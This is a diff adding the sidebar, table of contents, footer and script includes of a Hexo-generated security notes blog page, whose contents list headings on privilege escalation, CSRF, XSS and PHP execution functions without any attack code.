+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#UDF提权原理"><span class="nav-number">1.</span> <span class="nav-text">UDF提权原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MOF提权"><span class="nav-number">2.</span> <span class="nav-text">MOF提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF绕过-Referer"><span class="nav-number">3.</span> <span class="nav-text">CSRF绕过 Referer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS盲打到内网"><span class="nav-number">4.</span> <span class="nav-text">XSS盲打到内网</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP代码执行函数"><span class="nav-number">5.</span> <span class="nav-text">PHP代码执行函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-命令执行函数"><span class="nav-number">6.</span> <span class="nav-text">PHP 命令执行函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-变量覆盖"><span class="nav-number">7.</span> <span class="nav-text">PHP 变量覆盖</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
